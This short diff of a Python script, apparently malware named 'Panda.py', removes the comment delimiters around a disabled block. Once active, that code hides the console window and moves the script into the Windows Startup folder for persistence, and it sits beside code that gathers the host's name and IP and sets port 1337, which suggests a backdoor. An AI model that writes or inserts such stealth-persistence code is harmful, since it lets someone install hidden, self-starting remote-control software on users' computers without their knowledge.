@@ -17,8 +17,7 @@ from threading import Thread
 import re
 
 
-#DONT DELETE COMMAND ELSE IT WILL BE IN AUTOSTART FOLDER AND NOT VISIBLE
-"""
+
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 
@@ -44,7 +43,6 @@ script = __file__
 
 shutil.move(script, "C:\\Users\\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Panda.py")
 
-"""
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 port = 1337
